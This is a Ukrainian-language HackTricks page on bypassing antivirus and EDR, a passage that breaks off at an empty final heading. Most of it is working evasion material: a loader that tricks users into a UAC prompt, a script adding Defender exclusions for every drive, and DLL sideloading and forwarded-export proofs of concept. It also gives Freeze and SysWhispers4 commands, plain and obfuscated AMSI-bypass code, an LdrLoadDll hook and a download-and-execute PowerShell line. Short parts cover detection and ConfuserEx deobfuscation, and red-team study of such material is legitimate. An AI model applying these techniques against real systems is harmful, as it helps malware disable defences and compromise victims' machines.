# Обхід антивірусу (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для зупинки роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для зупинки роботи Windows Defender, який видає себе за інший AV.
- [Вимкнути Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### Приманка UAC у стилі інсталятора перед втручанням у Defender

Загальнодоступні loaders, що маскуються під чіти для ігор, часто постачаються як непідписані інсталятори Node.js/Nexe, які спочатку **запитують у користувача підвищення привілеїв**, а лише потім нейтралізують Defender. Схема проста:

1. Перевірити наявність прав адміністратора за допомогою `net session`. Команда виконується успішно лише за наявності прав адміністратора, тому невдача означає, що loader запущено від імені звичайного користувача.
2. Одразу повторно запустити себе з дієсловом `RunAs`, щоб викликати очікуваний запит UAC на підтвердження, зберігши початковий командний рядок.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Жертви вже вважають, що встановлюють «зламане» ПЗ, тому зазвичай приймають запит, надаючи malware права, потрібні для зміни політики Defender.<sup>[[26]](#references)</sup>

### Широкі виключення `MpPreference` для кожної літери диска

Після підвищення привілеїв ланцюжки на кшталт GachiLoader максимально використовують сліпі зони Defender, а не вимикають службу повністю. Спочатку loader завершує роботу GUI-сторожа (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, щоб жодні профілі користувачів, системні каталоги та знімні диски не сканувалися:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ключові спостереження:

- Цикл обходить кожну підключену файлову систему (D:\, E:\, USB-накопичувачі тощо), тож **будь-яке майбутнє payload, збережене будь-де на диску, ігноруватиметься**.
- Виключення розширення `.sys` передбачає майбутнє: зловмисники залишають собі можливість пізніше завантажувати непідписані драйвери, не взаємодіючи з Defender повторно.
- Усі зміни вносяться в `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дає змогу на наступних етапах переконатися, що виключення збереглися, або розширити їх, не викликаючи UAC повторно.

Оскільки жодну службу Defender не зупинено, наївні перевірки стану й надалі повідомляють, що «антивірус активний», хоча перевірка в реальному часі не охоплює ці шляхи.<sup>[[26]](#references)</sup>

## **Методологія обходу AV**

Наразі AV використовують різні методи для визначення того, чи є файл шкідливим: статичне виявлення, динамічний аналіз, а в просунутіших EDR — поведінковий аналіз.

### **Статичне виявлення**

Статичне виявлення працює шляхом пошуку відомих шкідливих рядків або масивів байтів у двійковому файлі чи скрипті, а також отримання інформації безпосередньо з файлу (наприклад, опису файлу, назви компанії, цифрових підписів, іконки, контрольної суми тощо). Це означає, що використання відомих загальнодоступних інструментів підвищує ймовірність викриття, адже їх, імовірно, уже проаналізували та позначили як шкідливі. Є кілька способів обійти такий тип виявлення:

- **Шифрування**

Якщо зашифрувати двійковий файл, AV не зможе виявити вашу програму, але знадобиться певний loader, щоб розшифрувати її та запустити в пам’яті.

- **Обфускація**

Іноді достатньо змінити кілька рядків у двійковому файлі чи скрипті, щоб він пройшов повз AV, але це може забрати чимало часу — залежно від того, що саме ви намагаєтеся обфускувати.

- **Власні інструменти**

Якщо розробити власні інструменти, відомих шкідливих сигнатур для них не буде, але це потребує багато часу та зусиль.

> [!TIP]
> Для перевірки на статичне виявлення Windows Defender добре підійде [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він ділить файл на кілька сегментів і доручає Defender сканувати кожен окремо. Так можна точно визначити, які рядки або байти у двійковому файлі позначаються.

Наполегливо рекомендую переглянути цей [плейлист на YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний обхід AV.

### **Динамічний аналіз**

Динамічний аналіз — це коли AV запускає ваш двійковий файл у sandbox і стежить за шкідливою активністю (наприклад, спробами розшифрувати й прочитати паролі з браузера, створити minidump LSASS тощо). З цим може бути трохи складніше, але ось кілька способів уникнути виявлення sandbox.

- **Затримка перед виконанням** Залежно від реалізації це може бути чудовим способом обійти динамічний аналіз AV. AV має дуже мало часу на сканування файлів, щоб не переривати роботу користувача, тому тривала затримка може завадити аналізу двійкових файлів. Проблема в тому, що багато sandbox AV можуть просто пропустити затримку — залежно від того, як її реалізовано.
- **Перевірка ресурсів комп’ютера** Зазвичай sandbox мають дуже мало ресурсів (наприклад, < 2GB RAM), інакше вони могли б сповільнити роботу комп’ютера користувача. Тут можна проявити творчий підхід: наприклад, перевірити температуру CPU або навіть швидкість обертання вентиляторів — у sandbox може бути реалізовано не все.
- **Перевірки, специфічні для комп’ютера** Якщо ви хочете націлитися на користувача, робоча станція якого приєднана до домену "contoso.local", можна перевірити домен комп’ютера на відповідність заданому. Якщо він не збігається, програму можна завершити.

Виявилося, що computername sandbox Microsoft Defender — HAL9TH. Тож перед запуском можна перевірити ім’я комп’ютера у вашому malware: якщо це HAL9TH, ви перебуваєте в sandbox Defender, і програму можна завершити.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька справді корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо протидії sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> канал #malware-dev</p></figcaption></figure>

Як ми вже казали в цій публікації, **загальнодоступні інструменти** рано чи пізно **виявлятимуться**, тож варто поставити собі таке запитання:

Наприклад, якщо вам потрібно скинути LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися іншим, менш відомим проєктом, який також скидає LSASS?

Імовірно, правильна відповідь — другий варіант. Візьмімо mimikatz як приклад: це, мабуть, один із найбільш позначених AV та EDR зразків malware, якщо не найбільш позначений. Сам проєкт чудовий, але обійти AV під час роботи з ним — справжній кошмар. Тож шукайте альтернативи для виконання потрібного завдання.

> [!TIP]
> Змінюючи payload для обходу виявлення, обов’язково **вимкніть автоматичне надсилання зразків** у Defender і, будь ласка, серйозно, **НЕ ЗАВАНТАЖУЙТЕ ФАЙЛИ НА VIRUSTOTAL**, якщо ваша мета — домогтися тривалого обходу виявлення. Якщо хочете перевірити, чи виявляє ваш payload певний AV, установіть його на VM, спробуйте вимкнути автоматичне надсилання зразків і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **віддавайте перевагу DLL для обходу виявлення**. З мого досвіду, DLL-файли зазвичай **виявляють і аналізують набагато рідше**, тож у деяких випадках це дуже простий спосіб уникнути виявлення (звісно, якщо ваш payload можна запустити як DLL).

Як видно на цьому зображенні, рівень виявлення DLL Payload від Havoc на antiscan.me становить 4/26, тоді як для EXE payload він дорівнює 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння на antiscan.me звичайного Havoc EXE payload і звичайної Havoc DLL</p></figcaption></figure>

Далі розглянемо кілька трюків із DLL-файлами, які допоможуть діяти значно непомітніше.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи вразливу програму та шкідливі payload поруч.

Перевірити програми, вразливі до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та такого powershell-скрипту:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ця команда виведе список програм у каталозі "C:\Program Files\\" , вразливих до DLL hijacking, а також файлів DLL, які вони намагаються завантажити.

Я наполегливо рекомендую **самостійно дослідити програми, вразливі до DLL Hijacking/Sideloading**. За належного виконання ця техніка досить непомітна, але якщо використовувати загальновідомі програми, вразливі до DLL Sideloading, вас можуть легко виявити.

Якщо просто розмістити шкідливу DLL з назвою, яку очікує завантажити програма, це не завантажить ваш payload, оскільки програма очікує, що ця DLL міститиме певні функції. Щоб вирішити цю проблему, ми скористаємося іншою технікою під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики програми з проксі-DLL (шкідливої DLL) до оригінальної DLL, зберігаючи таким чином функціональність програми та даючи змогу керувати виконанням вашого payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/flangvik/)

Ось кроки, яких я дотримувався:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну перейменовану DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають Detection rate 0/26 на [antiscan.me](https://antiscan.me)! Це можна вважати успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Дуже рекомендую** подивитися [VOD S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб докладніше дізнатися про те, що ми обговорили.

### Зловживання Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є «forwarders»: замість вказівки на код запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли викликач шукає цей експорт, завантажувач Windows:

- Завантажує `TargetDll`, якщо він ще не завантажений
- Знаходить у ньому `TargetFunc`

Важливо розуміти такі особливості:
- Якщо `TargetDll` — це KnownDLL, його буде взято з захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, до якого входить каталог модуля, що виконує переспрямування.

Це дає змогу застосувати непрямий sideloading: знайти підписану DLL, яка експортує функцію, переспрямовану до модуля, що не є KnownDLL, а потім розмістити цю підписану DLL поруч із контрольованою зловмисником DLL, назва якої точно збігається з назвою цільового модуля, на який переспрямовано виклик. Коли викликається переспрямований експорт, завантажувач обробляє переспрямування та завантажує вашу DLL із того самого каталогу, виконуючи ваш DllMain.<sup>[[13]](#references)</sup>

Приклад, зафіксований у Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` не є KnownDLL, тому його знаходять у звичайному порядку пошуку.

PoC (скопіюйте й вставте):
1) Скопіюйте підписану системну DLL до папки з правом запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливу `NCRYPTPROV.dll` у ту саму папку. Для виконання коду достатньо мінімальної `DllMain`; реалізовувати функцію, на яку переспрямовуються виклики, не потрібно, щоб запустити `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Запустіть перенаправлення за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Спостережувана поведінка:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час пошуку `KeyIsoSetAuditingInterface` завантажувач переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` з `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" з’явиться лише після запуску `DllMain`

Поради з пошуку:
- Зосередьтеся на forwarded exports, цільовий модуль яких не є KnownDLL. KnownDLLs перелічено в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Можна перерахувати forwarded exports за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте список форвардерів Windows 11, щоб знайти відповідні варіанти: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL із нестандартних системних шляхів, а потім завантажують із тієї самої директорії DLL, яких немає в KnownDLLs, але які мають таку саму базову назву
- Сповіщайте про ланцюжки процесів/модулів на кшталт: `rundll32.exe` → нестандартна системна `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачам
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте запис і виконання в директоріях програм

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze — це набір інструментів для payload, призначений для обходу EDR за допомогою призупинених процесів, прямих системних викликів та альтернативних методів виконання`

За допомогою Freeze можна непомітно завантажувати й виконувати свій shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це гра в кішки-мишки: те, що працює сьогодні, завтра можуть виявити. Тому ніколи не покладайтеся лише на один інструмент і, якщо можливо, спробуйте поєднувати кілька технік evasion.

## Direct/Indirect Syscalls і визначення SSN (SysWhispers4)

EDR часто встановлюють **inline hooks у user-mode** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна створити stubs для **direct** або **indirect syscalls**, які завантажують правильний **SSN** (System Service Number) і переходять у режим ядра, не виконуючи перехоплену точку входу експорту.<sup>[[32]](#references)</sup>

**Варіанти виклику:**
- **Direct (embedded)**: додати інструкцію `syscall`/`sysenter`/`SVC #0` до згенерованого stub (без звернення до експорту `ntdll`).
- **Indirect**: перейти до наявного gadget `syscall` усередині `ntdll`, щоб перехід у режим ядра виглядав так, ніби він починається з `ntdll` (корисно для обходу евристик); **randomized indirect** вибирає gadget із набору для кожного виклику.
- **Egg-hunt**: не зберігати статичну послідовність opcode `0F 05` на диску, а знаходити послідовність syscall під час виконання.

**Стратегії визначення SSN, стійкі до hooks:**
- **FreshyCalls (VA sort)**: визначати SSN, сортуючи syscall stubs за віртуальними адресами замість читання байтів stubs.
- **SyscallsFromDisk**: відобразити чисту `\KnownDlls\ntdll.dll`, прочитати SSN з її `.text`, а потім відобразити її — так обходяться всі hooks у пам’яті.
- **RecycledGate**: поєднати визначення SSN за відсортованими VA з перевіркою opcode, якщо stub чистий; якщо його перехоплено — перейти до визначення за VA.
- **HW Breakpoint**: встановити DR0 на інструкцію `syscall` і використати VEH, щоб під час виконання отримати SSN з `EAX`, не аналізуючи перехоплені байти.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання «[безфайловому malware](https://en.wikipedia.org/wiki/Fileless_malware)». Спочатку AV могли сканувати лише **файли на диску**, тож якщо вдавалося виконати payloads **безпосередньо в пам’яті**, AV нічого не міг із цим вдіяти, оскільки не мав достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows:

- Контроль облікових записів користувачів, або UAC (підвищення привілеїв EXE, COM, MSI або встановлення ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічне виконання коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- Макроси Office VBA

Це дає антивірусним рішенням змогу перевіряти поведінку скриптів, надаючи їхній вміст у незашифрованому та необфускованому вигляді.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` викличе таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу: до вмісту додається `amsi:`, а потім шлях до виконуваного файла, з якого запущено скрипт, у цьому випадку — powershell.exe.

Ми не записували жодного файла на диск, але все одно були виявлені в пам’яті через AMSI.

Крім того, починаючи з **.NET 4.8**, код C# також перевіряється через AMSI. Це впливає навіть на `Assembly.Load(byte[])`, який завантажує код для виконання в пам’яті. Тому для виконання в пам’яті, якщо потрібно обійти AMSI, рекомендується використовувати старіші версії .NET (наприклад, 4.7.2 або нижче).

Є кілька способів обійти AMSI:

- **Обфускація**

Оскільки AMSI переважно використовує статичне виявлення, зміна скриптів, які ви намагаєтеся завантажити, може допомогти уникнути виявлення.

Однак AMSI здатний деобфускувати скрипти навіть із кількома шарами обфускації, тож залежно від способу її застосування це може бути невдалим варіантом. Через це обхід не такий простий. Водночас іноді достатньо змінити кілька назв змінних — і все працюватиме, тож це залежить від того, наскільки щось позначено як підозріле.

- **Обхід AMSI**

Оскільки AMSI реалізовано через завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), нею легко маніпулювати навіть без привілейованого облікового запису. Через цю ваду в реалізації AMSI дослідники знайшли кілька способів обійти сканування AMSI.

**Примусове спричинення помилки**

Примусове завершення ініціалізації AMSI з помилкою (amsiInitFailed) призведе до того, що в поточному процесі сканування не запускатиметься. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру, щоб запобігти широкому використанню цього методу.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Усе, що знадобилося, — один рядок коду PowerShell, щоб зробити AMSI непридатним до використання в поточному процесі PowerShell. Звісно, сам AMSI позначив цей рядок, тож для застосування цієї техніки потрібні певні зміни.

Ось модифікований обхід AMSI, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Майте на увазі, що після публікації цей допис, імовірно, позначать, тож не публікуйте код, якщо плануєте залишитися непоміченими.

**Memory Patching**

Цю техніку вперше виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона полягає в пошуку адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезаписі її інструкціями, що повертають код E_INVALIDARG. У такий спосіб результат фактичного сканування буде 0, що інтерпретується як чистий результат.

> [!TIP]
> Щоб докладніше розібратися, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Існує також багато інших технік обходу AMSI за допомогою powershell. Дізнайтеся про них більше на [**цій сторінці**](basic-powershell-for-pentesters/index.html#amsi-bypass) і в [**цьому репозиторії**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Блокування AMSI через запобігання завантаженню amsi.dll (hook для LdrLoadDll)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний, незалежний від мови спосіб обходу — встановити hook у користувацькому режимі на `ntdll!LdrLoadDll`, який повертатиме помилку, якщо запитаний модуль — `amsi.dll`. У результаті AMSI не завантажується, і сканування цього процесу не відбувається.<sup>[[23]](#references)</sup>

Загальний опис реалізації (псевдокод на x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Нотатки
- Працює з PowerShell, WScript/CScript і custom loaders (усім, що інакше завантажувало б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів у командному рядку.
- Використовувалося loaders, запущеними через LOLBins (наприклад, `regsvr32`, який викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає сигнатур завдяки рандомізованим визначеним користувачем функціям, змінним, виразам із символів і випадковому змінюванню регістру символів у ключових словах PowerShell.

**Видалення виявленої сигнатури**

Щоб видалити виявлену сигнатуру AMSI з пам’яті поточного процесу, можна скористатися такими інструментами, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**. Цей інструмент сканує пам’ять поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, які використовують AMSI**

Список продуктів AV/EDR, які використовують AMSI, можна знайти тут: **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використання PowerShell версії 2**
Якщо використовувати PowerShell версії 2, AMSI не завантажуватиметься, тож можна запускати скрипти без сканування AMSI. Це можна зробити так:

```bash
powershell.exe -version 2
```

## Логування PS

Логування PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисним для аудиту й усунення несправностей, але також може стати **проблемою для зловмисників, які хочуть уникнути виявлення**.

Щоб обійти логування PowerShell, можна скористатися такими методами:

- **Вимкнути PowerShell Transcription і Module Logging**: для цього можна використати такий інструмент, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Використати PowerShell версії 2**: якщо використовувати PowerShell версії 2, AMSI не завантажується, тому скрипти можна запускати без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Використати некерований сеанс PowerShell**: використовуйте [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб розмістити PowerShell, не запускаючи `powershell.exe` (цей підхід використовується в `powerpick` від Cobalt Strike). Це обходить засоби контролю, прив’язані саме до процесу `powershell.exe`, але саме по собі не вимикає AMSI, Script Block Logging чи інші засоби захисту PowerShell; охоплення залежить від середовища виконання та реалізації хоста.


## Обфускація

> [!TIP]
> Деякі методи обфускації передбачають шифрування даних, що підвищує ентропію бінарного файла й полегшує його виявлення антивірусами та EDR. Будьте обережні й, можливо, застосовуйте шифрування лише до окремих фрагментів коду, які є чутливими або мають бути приховані.

### Деобфускація .NET-бінарних файлів, захищених ConfuserEx

Під час аналізу malware, що використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома рівнями захисту, які блокують декомпілятори й пісочниці. Наведений нижче процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення захисту від підміни — ConfuserEx шифрує кожне *тіло методу* й розшифровує його у статичному конструкторі *модуля* (`<Module>.cctor`). Він також змінює контрольну суму PE, тому будь-яка модифікація спричинить аварійне завершення бінарного файла. Використайте **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити ключі XOR і переписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Вивід містить 6 параметрів anti-tamper (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів і потоку керування — передайте *чистий* файл у **de4dot-cex** (форк de4dot з підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Параметри:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує flattening потоку керування, відновить початкові простори імен, класи та назви змінних і розшифрує рядки-константи.

3.  Видалення proxy-викликів – ConfuserEx замінює прямі виклики методів легковаговими обгортками (так званими *proxy-викликами*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні API .NET, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

4.  Ручне очищення — запустіть отриманий бінарний файл у dnSpy та шукайте великі блоки Base64 або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *справжній* payload. Часто malware зберігає його у вигляді TLV-кодованого масиву байтів, ініціалізованого всередині `<Module>.byte_0`.

Наведений вище ланцюжок відновлює потік виконання **без** запуску шкідливого зразка — це корисно під час роботи на ізольованій робочій станції.

> 🛈  ConfuserEx створює користувацький атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного первинного аналізу зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# обфускатор**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати форк набору інструментів компіляції [LLVM](http://www.llvm.org/) з відкритим кодом, здатний підвищити безпеку програмного забезпечення за допомогою [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захисту від втручання.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації обфускованого коду під час компіляції без зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар обфускованих операцій, згенерованих засобами метапрограмування шаблонів C++, що трохи ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор x64-бінарних файлів, який може обфускувати різні PE-файли, зокрема .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк для дрібнозернистої обфускації коду мов, що підтримуються LLVM, із використанням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюжки, що руйнує наше звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE-криптер, написаний мовою Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Самомаскування окремих функцій за допомогою компілятора LLVM

